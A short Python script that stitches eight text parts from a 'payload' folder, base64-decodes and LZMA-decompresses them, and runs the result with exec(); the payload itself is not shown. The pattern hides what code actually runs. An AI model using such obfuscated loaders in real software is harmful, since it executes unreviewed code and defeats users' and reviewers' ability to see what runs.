#!/usr/bin/env python3
from pathlib import Path
import base64
import lzma

payload_dir = Path(__file__).with_name("payload")
payload = "".join(
    (payload_dir / f"part{index:02d}.txt").read_text(encoding="utf-8").strip()
    for index in range(8)
)
source = lzma.decompress(base64.b64decode(payload)).decode("utf-8")
exec(compile(source, __file__, "exec"))
